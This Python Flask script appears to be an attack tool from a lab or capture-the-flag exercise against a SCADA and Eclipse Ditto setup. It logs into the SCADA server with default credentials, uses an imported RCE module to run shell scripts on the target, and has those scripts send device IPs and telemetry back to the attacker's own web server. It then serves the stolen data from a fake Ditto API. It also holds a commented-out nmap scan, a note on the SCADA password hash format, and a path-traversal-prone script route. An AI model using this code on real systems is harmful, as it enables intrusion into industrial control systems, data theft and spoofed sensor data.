from flask import Flask, request, jsonify
import nmap
import threading
from RCE import RCE
from utils import get_ip_address

this_ip = get_ip_address('eth0')
this_port = 80

scada_url='http://172.16.10.100:8080' # get with scan

with open('scripts/fetch_ip_ditto.sh', 'r') as f:
    data = f.read()
with open('scripts/fetch_ip_ditto.sh', 'w') as f:
    f.write(data % (this_ip, this_port))

ip_ditto = None
last_data_ditto = {}

rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
scanner = nmap.PortScanner()
app = Flask(__name__)

@app.route('/get_script/<string:name>')
def get_script(name):
    if not name: return "error"

    with open('scripts/'+name, 'r') as f:
        return f.read()

@app.route('/ip_ditto', methods=["POST"])
def route_ip_ditto():
    ip_ditto = str(request.get_data().decode())
    print("IP DITTO FRONTEND: "+ip_ditto, flush=True)

    with open('scripts/fetch_data_ditto.sh', 'r') as f:
        data = f.read()
    with open('scripts/fetch_data_ditto.sh', 'w') as f:
        f.write(data % (ip_ditto, this_ip, this_port))

    return "Stored"

@app.route('/data_ditto', methods=["POST"])
def route_data_ditto():
    json = request.get_json()
    for thing in json['items']:
        last_data_ditto[thing['thingId']] = thing['features']

    print(last_data_ditto, flush=True)
    return "Stored"

@app.route('/api/2/things/<string:thing_id>/features')
def route_simulation(thing_id):
    return last_data_ditto[thing_id]

if __name__ == "__main__":
    ### WEBSERVER
    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
    webserverThread.start()

    ### RCE
    rce.execute_script('fetch_ip_ditto.sh')
    rce.execute_script('fetch_data_ditto.sh')

    # SCAN
    '''
    scanner.scan('172.16.10.99-101')
    for host in scanner.all_hosts():
        print("\n\nHost: ", host)
        print("State: ", scanner[host].state())
        for proto in scanner[host].all_protocols():
            print("Protocol: ", proto)
            ports = scanner[host][proto].keys()
            for port in ports:
                print("Port: ", port, "State: ", scanner[host][proto][port]['state'])
                '''
    
    # Possible Hash per password Scada DB
    # Base64(unhex(SHA-1($plaintext)))
